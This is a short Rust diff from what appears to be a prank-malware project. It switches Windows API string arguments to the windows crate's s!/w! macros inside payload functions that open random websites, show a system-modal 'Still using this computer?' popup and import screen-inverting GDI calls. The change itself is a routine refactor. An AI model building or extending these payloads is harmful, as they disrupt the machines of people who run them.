@@ -27,6 +27,7 @@ use crate::{
 };
 use windows::{
     core::{PCSTR, PCWSTR},
+    s, w,
     Win32::{
         Foundation::{HMODULE, HWND, LPARAM, POINT, RECT},
         Graphics::Gdi::{BitBlt, GetWindowDC, ReleaseDC, StretchBlt, NOTSRCCOPY, SRCCOPY},
@@ -109,7 +110,7 @@ pub fn payload_thread(parameter: &Payload) {
 fn payload_execute(times: i32, _runtime: i32) -> i32 {
     wrap_shell_execute_w(
         HWND::default(),
-        "open",
+        w!("open"),
         SITES[rand::random::<usize>() % N_SITES],
         PCWSTR::null(),
         PCWSTR::null(),
@@ -144,8 +145,8 @@ fn payload_message_box(times: i32, _runtime: i32) -> i32 {
         )?;
         wrap_messagebox_a(
             HWND::default(),
-            "Still using this computer?",
-            "lol",
+            s!("Still using this computer?"),
+            s!("lol"),
             MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING,
         )?;
         wrap_unhook_windows_hook_ex(hook)?;
